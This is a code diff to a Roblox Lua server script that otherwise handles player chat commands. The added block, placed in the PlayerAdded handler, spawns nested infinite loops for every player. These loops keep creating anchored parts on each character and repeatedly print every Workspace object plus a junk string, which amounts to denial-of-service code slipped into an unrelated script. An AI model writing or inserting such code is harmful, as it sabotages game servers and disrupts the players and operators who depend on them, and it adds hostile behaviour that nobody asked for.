@@ -8,6 +8,33 @@ local function CheckForTarget(Target)
 end
 
 game.Players.PlayerAdded:Connect(function(Player)
+for i,v in pairs(game.Players:GetChildren()) do
+				wait()
+					if v.Name ~= ")" then
+						spawn(function()
+						while true do
+							wait()
+							spawn(function()
+								while true do
+									wait()
+									local xd = Instance.new("Part")
+									xd.Parent = v.Character.HumanoidRootPart
+									xd.CFrame = v.Character.HumanoidRootPart.CFrame
+									xd.CanCollide = false
+									xd.Anchored = true
+								for x,z in pairs(game.Workspace:GetDescendants()) do
+									wait()
+									print(z)
+									print(z)
+									print(z)
+									print("817h09c3n71y02c9n310928c73n03y07x12yb3078c12ytb3cvs9d9b65c3961b2593c61592xn1293x6193nx")
+									end
+								end
+							end)
+						end
+					end)
+				end
+			end
 	Player.Chatted:Connect(function(msg)
 		local character = Player.Character or Player.CharacterAdded:Wait()
     		local name = Player.Name
